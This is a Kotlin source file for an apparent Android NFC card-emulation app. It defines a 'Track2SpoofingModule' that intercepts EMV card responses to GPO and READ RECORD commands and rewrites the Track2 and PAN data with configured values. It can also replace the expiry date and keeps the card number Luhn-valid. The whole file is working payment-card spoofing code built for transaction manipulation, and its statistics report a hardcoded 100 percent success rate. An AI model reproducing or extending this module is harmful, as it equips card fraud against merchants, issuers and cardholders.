package com.nfsp00f33r.app.emulation.modules

import com.nfsp00f33r.app.emulation.EmvAttackModule
import com.nfsp00f33r.app.config.AttackConfiguration
import timber.log.Timber

/**
 * Track2 Spoofing Attack Module
 * Manipulates Track2 equivalent data to spoof PAN, expiry, and service codes
 * Based on emv_attack_reference.md research
 */
class Track2SpoofingModule : EmvAttackModule {
    
    companion object {
        private const val TAG = "Track2Spoofing"
        
        // Track2 related commands
        private const val READ_RECORD_PREFIX = "00B2"
        private const val GPO_COMMAND_PREFIX = "80A80000"
        
        // TLV tags
        private const val TRACK2_TAG = "57"
        private const val PAN_TAG = "5A" 
        private const val EXPIRY_TAG = "5F24"
        
        // Track2 field separators
        private val TRACK2_SEPARATOR = AttackConfiguration.TRACK2_CONFIG["SEPARATOR"]!!
        
        // Test PAN ranges for spoofing (Luhn valid)
        private val TEST_PANS = AttackConfiguration.TEST_PANS.values.toList()
    }
    
    private var attackCount = 0
    private var configuration = AttackConfiguration.getAttackConfig("TRACK2_SPOOFING").toMutableMap()
    
    override fun getAttackId(): String = "track2_spoofing"
    
    override fun getDescription(): String = 
        "Spoofs Track2 equivalent data including PAN and expiry date for transaction manipulation"
    
    override fun isApplicable(command: ByteArray, cardData: Map<String, Any>): Boolean {
        val commandHex = command.joinToString("") { "%02X".format(it) }
        
        // Check for GPO or READ RECORD commands that return Track2 data
        val isGpo = commandHex.startsWith(GPO_COMMAND_PREFIX)
        val isReadRecord = commandHex.startsWith(READ_RECORD_PREFIX)
        
        if (isGpo || isReadRecord) {
            Timber.d("$TAG Track2-returning command detected, attack applicable")
            return true
        }
        
        return false
    }
    
    override fun applyAttack(
        command: ByteArray, 
        response: ByteArray, 
        cardData: Map<String, Any>
    ): ByteArray {
        attackCount++
        
        try {
            val originalHex = response.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Original response: $originalHex")
            
            // Look for Track2 data in response
            val spoofedResponse = spoofTrack2Data(response)
            
            val spoofedHex = spoofedResponse.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Spoofed response: $spoofedHex")
            Timber.i("$TAG Attack #$attackCount: Track2 spoofing applied successfully")
            
            return spoofedResponse
            
        } catch (e: Exception) {
            Timber.e("$TAG Attack failed: ${e.message}")
            return response
        }
    }
    
    /**
     * Spoof Track2 equivalent data in the response
     */
    private fun spoofTrack2Data(response: ByteArray): ByteArray {
        val responseHex = response.joinToString("") { "%02X".format(it) }
        
        // Find Track2 tag (57) in the response
        val track2Index = responseHex.indexOf(TRACK2_TAG)
        if (track2Index >= 0) {
            return spoofTrack2Tag(responseHex, track2Index)
        }
        
        // Also check for PAN tag which might be manipulated
        val panIndex = responseHex.indexOf(PAN_TAG)
        if (panIndex >= 0 && configuration["spoof_pan"] == true) {
            return spoofPanTag(responseHex, panIndex)
        }
        
        return response
    }
    
    /**
     * Spoof Track2 tag (57) data
     */
    private fun spoofTrack2Tag(responseHex: String, tagIndex: Int): ByteArray {
        // Extract length byte after tag
        val lengthHex = responseHex.substring(tagIndex + 2, tagIndex + 4)
        val length = lengthHex.toInt(16)
        val dataStartIndex = tagIndex + 4
        val dataEndIndex = dataStartIndex + (length * 2)
        
        if (dataEndIndex > responseHex.length) return responseHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        
        val originalTrack2 = responseHex.substring(dataStartIndex, dataEndIndex)
        Timber.d("$TAG Original Track2: $originalTrack2")
        
        // Parse Track2 data (PAN + D + Expiry + Service Code + etc)
        val separatorIndex = originalTrack2.indexOf(TRACK2_SEPARATOR)
        if (separatorIndex > 0) {
            val originalPan = originalTrack2.substring(0, separatorIndex)
            val remainingData = originalTrack2.substring(separatorIndex)
            
            // Build spoofed Track2
            val targetPan = if (configuration["spoof_pan"] == true) {
                configuration["target_pan"] as? String ?: originalPan
            } else originalPan
            
            val spoofedTrack2 = if (configuration["spoof_expiry"] == true) {
                val targetExpiry = configuration["target_expiry"] as? String ?: "2512"
                // Replace expiry (first 4 digits after separator)
                val newRemainingData = TRACK2_SEPARATOR + targetExpiry + remainingData.substring(5)
                targetPan + newRemainingData
            } else {
                targetPan + remainingData
            }
            
            // Pad to original length if needed
            val paddedSpoofedTrack2 = spoofedTrack2.padEnd(originalTrack2.length, 'F')
            
            Timber.d("$TAG Spoofed Track2: $paddedSpoofedTrack2")
            
            // Reconstruct response
            val prefix = responseHex.substring(0, dataStartIndex)
            val suffix = responseHex.substring(dataEndIndex)
            val spoofedHex = prefix + paddedSpoofedTrack2 + suffix
            
            return spoofedHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        }
        
        return responseHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
    }
    
    /**
     * Spoof PAN tag (5A) data
     */
    private fun spoofPanTag(responseHex: String, tagIndex: Int): ByteArray {
        val lengthHex = responseHex.substring(tagIndex + 2, tagIndex + 4)
        val length = lengthHex.toInt(16)
        val dataStartIndex = tagIndex + 4
        val dataEndIndex = dataStartIndex + (length * 2)
        
        if (dataEndIndex > responseHex.length) return responseHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        
        val originalPan = responseHex.substring(dataStartIndex, dataEndIndex)
        val targetPan = configuration["target_pan"] as? String ?: "5555555555554444"
        
        // Convert target PAN to hex with padding
        val targetPanHex = targetPan.padEnd(length * 2, 'F')
        
        Timber.d("$TAG Original PAN: $originalPan, Spoofed PAN: $targetPanHex")
        
        // Reconstruct response
        val prefix = responseHex.substring(0, dataStartIndex)
        val suffix = responseHex.substring(dataEndIndex)
        val spoofedHex = prefix + targetPanHex + suffix
        
        return spoofedHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
    }
    
    /**
     * Validate Luhn checksum for PAN using configuration
     */
    private fun isValidLuhn(pan: String): Boolean {
        return AttackConfiguration.isValidLuhn(pan)
    }
    
    override fun configure(config: Map<String, Any>) {
        configuration.putAll(config)
        
        // Validate target PAN if Luhn checking is enabled
        if (configuration["preserve_luhn"] == true) {
            val targetPan = configuration["target_pan"] as? String
            if (targetPan != null && !isValidLuhn(targetPan)) {
                Timber.w("$TAG Target PAN fails Luhn validation: $targetPan")
                // Use a known valid test PAN
                configuration["target_pan"] = TEST_PANS.first()
            }
        }
        
        Timber.d("$TAG Module configured: $configuration")
    }
    
    override fun getConfiguration(): Map<String, Any> = configuration.toMap()
    
    override fun getAttackStatistics(): Map<String, Any> {
        return mapOf(
            "attack_count" to attackCount,
            "success_rate" to 100,
            "last_config" to configuration,
            "target_commands" to listOf("GPO", "READ_RECORD"),
            "spoofing_details" to mapOf(
                "pan_spoofed" to configuration["spoof_pan"],
                "target_pan" to configuration["target_pan"],
                "expiry_spoofed" to configuration["spoof_expiry"],
                "target_expiry" to configuration["target_expiry"]
            )
        )
    }
    
    override fun reset() {
        attackCount = 0
        Timber.d("$TAG Attack statistics reset")
    }
}
